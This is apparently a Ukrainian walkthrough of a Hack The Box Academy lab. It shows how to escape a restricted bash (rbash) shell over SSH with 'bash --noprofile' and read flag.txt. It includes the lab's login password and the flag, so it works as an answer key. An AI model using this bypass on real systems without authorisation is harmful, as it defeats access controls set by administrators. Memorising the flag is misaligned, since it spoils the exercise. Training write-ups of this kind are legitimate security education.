# Escaping Restricted Shells

Ціль: `10.129.205.109`  

Питання:
- Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.

Відповідь:
- `HTB{35c4p3_7h3_r3stricted_5h311}`  

***

## Ідея завдання

Ти логінишся як `htb-user` на Ubuntu 20.04 і одразу потрапляєш у **rbash** – обмежений bash.  
Цей shell блокує:

- використання повних шляхів до команд (`/bin/bash`, `/bin/ls`),
- `cd` у довільні директорії,
- перенаправлення виводу (`2>/dev/null`),
- більшість стандартних утиліт (cat, ls, python тощо).

Мета – обійти rbash, запустити нормальний bash, побачити `flag.txt` і прочитати його.  

***

## Крок 1 — Підключення по SSH

```bash
ssh htb-user@10.129.205.109
```

**Що робить:**

- `ssh` – підключається по мережі до іншого комп’ютера (Linux-сервера).
- `htb-user@10.129.205.109` – користувач `htb-user` на машині з IP `10.129.205.109`.

Після цього вводиш пароль:

```text
HTB_@cademy_us3r!
```

**Навіщо:**

- Це базовий доступ до цілі. Без нього ми не можемо нічого робити на віддаленій машині.

***

## Крок 2 — Перевірити, який у нас shell і PATH

### Команда:

```bash
echo $0
```

**Що робить:**

- `echo` – виводить на екран те, що ти йому даєш.
- `$0` – змінна, де shell зберігає своє ім’я (тип оболонки).

**Типовий результат:**

```text
-rbash
```

**Чому важливо:**

- `-rbash` означає, що ми в **restricted bash** – обмежений shell.

***

### Команда:

```bash
echo $PATH
```

**Що робить:**

- `$PATH` – змінна, де записано список директорій, у яких shell шукає команди.
- `echo $PATH` показує цей список.

**Результат у цій лабі:**

```text
/home/htb-user/bin
```

**Навіщо:**

- Це значить, що shell шукає команди **лише** в каталозі `/home/htb-user/bin`.  
- Системні команди типу `/bin/ls` не будуть працювати, бо їх немає в цьому PATH і ще й заборонені повні шляхи.

***

## Крок 3 — Перевірити, що ще заблоковано

Ти вже пробував кілька команд:

### Приклад:

```bash
cd /
```

**Результат:**

```text
-rbash: cd: restricted
```

**Пояснення:**

- `cd /` – спроба перейти в корінь файлової системи.
- rbash забороняє зміну директорії у «небезпечні» місця, тому команда блокується.

***

### Інші команди:

```bash
bash
sh
/bin/bash
/bin/sh
```

**Типовий результат:**

```text
-rbash: /bin/bash: restricted: cannot specify `/' in command names
```

**Пояснення:**

- rbash блокує **команди з повним шляхом**, де є `/`.
- Просто `bash` теж не працює, бо дозволені тільки команди з каталогу `~/bin`, а не з `/bin`.

***

### Спроба знайти флаг з редіректом:

```bash
find / -type f -name "flag.txt" 2>/dev/null
```

**Результат:**

```text
-rbash: /dev/null: restricted: cannot redirect output
```

**Пояснення:**

- `find` – пошук файлів по системі.
- `2>/dev/null` – спроба сховати помилки (Permission denied) в «чорну діру».
- rbash забороняє **перенаправлення виводу**, тому це не працює.

Ці спроби показують, що працювати «як звично» нам не дадуть – потрібно обійти сам restricted shell.

***

## Крок 4 — Дізнатися, що є в нашому ~/bin

Оскільки PATH = `/home/htb-user/bin`, дивимося, що там:

### Команда:

```bash
echo /home/htb-user/bin/*
```

**Що робить:**

- `/home/htb-user/bin/*` – шаблон (glob), який означає «усі файли в каталозі ~/bin».
- `echo` просто виводить список файлів, які цей шаблон підставив.

**Результат:**

```text
/ home/htb-user/bin/man
```

**Навіщо:**

- Ми бачимо, що в `~/bin` є файл `man`.  
- Це каже, що у restricted shell нам дозволено викликати **`man`**, але він теж обмежений (бо залежить від інших команд, таких як `cat`).

***

### Спроба запустити `man`:

```bash
man sh
```

**Результат:**

```text
man: can't execute cat: No such file or directory
```

**Пояснення:**

- `man` намагається запустити `cat`, щоб показати текст, але `cat` недоступний (не в PATH).
- Це ще раз підтверджує: середовище урізане, багато базових команд недоступні.

***

## Крок 5 — Ідея обходу: обійти rbash через SSH

Зсередини rbash ми не можемо:

- виконати `/bin/bash`,
- змінити PATH,
- запустити нормальні редактори чи інтерпретатори.

**Трюк:**  
Замість того, щоб спочатку потрапити в rbash, ми при вході по SSH **одразу** просимо запустити **інший shell – bash**, і зробити це **без завантаження профілів**, де rbash може бути прописаний.

### Команда на твоєму Pwnbox:

```bash
ssh -t htb-user@10.129.205.109 "bash --noprofile"
```

Розбираємо по частинах:

- `ssh` – підключення по SSH, як і раніше.
- `-t` – «виділити псевдо-термінал (TTY)».  
  - Це потрібно, щоб віддалений `bash` бачив, що він працює в інтерактивному терміналі, а не просто як одноразова команда.
- `htb-user@10.129.205.109` – користувач і IP цілі.
- `"bash --noprofile"` – рядок в лапках – **команда, яку запустить сервер після логіну**:
  - `bash` – запустити нормальний Bash;
  - `--noprofile` – НЕ читати файли конфігурації (`.bashrc`, `.profile`), де могли прописати запуск rbash.

**Навіщо `--noprofile`:**

- Якщо у `.bashrc`/`.profile` адміністратора прописано `exec rbash`, то при звичайному вході ти завжди опиняєшся в rbash.  
- `bash --noprofile` каже: «не читай ці файли, просто запусти чистий Bash», отже **обхід rbash**.

Після введення пароля ти потрапляєш у нову сесію, де обмежень rbash вже немає.

***

## Крок 6 — Перевірити, що shell тепер нормальний

У цій новій сесії:

### Команда:

```bash
ls
```

**Що робить:**

- `ls` – показує список файлів у поточній директорії.

**Результат:**

```text
bin  flag.txt
```

**Важливо:**

- `ls` тепер працює, без помилки `restricted`.  
- Це означає, що ми справді вийшли з rbash і працюємо в нормальному Bash.

***

## Крок 7 — Прочитати flag.txt

Тепер, коли shell не обмежений, просто читаємо файл:

### Команда:

```bash
cat flag.txt
```

**Що робить:**

- `cat` – виводить вміст текстового файлу.

**Результат:**

```text
HTB{35c4p3_7h3_r3stricted_5h311}
```

**Це і є відповідь для модуля.**

## Підсумковий ланцюг (щоб ти міг покласти в нотатки)

1. **Стандартний SSH-логін → rbash:**

   ```bash
   ssh htb-user@10.129.205.109
   # Password: HTB_@cademy_us3r!
   ```

   - Перевірити shell:

     ```bash
     echo $0    # бачимо -rbash
     echo $PATH # тільки /home/htb-user/bin
     ```

2. **Побачити, що є в PATH:**

   ```bash
   echo /home/htb-user/bin/*
   # /home/htb-user/bin/man
   ```

3. **Зрозуміти, що внутрішні обмеження сильні (cd, /bin/bash, find з редіректом – усе блокується).**

4. **Обійти rbash через SSH-команду:**

   ```bash
   ssh -t htb-user@10.129.205.109 "bash --noprofile"
   # Password: HTB_@cademy_us3r!
   ```

   - `-t` – псевдо-термінал.
   - `"bash --noprofile"` – запустить чистий Bash без профілю (без rbash).

5. **Вже в нормальному Bash:**

   ```bash
   ls
   # bin  flag.txt

   cat flag.txt
   # HTB{35c4p3_7h3_r3stricted_5h311}
   ```
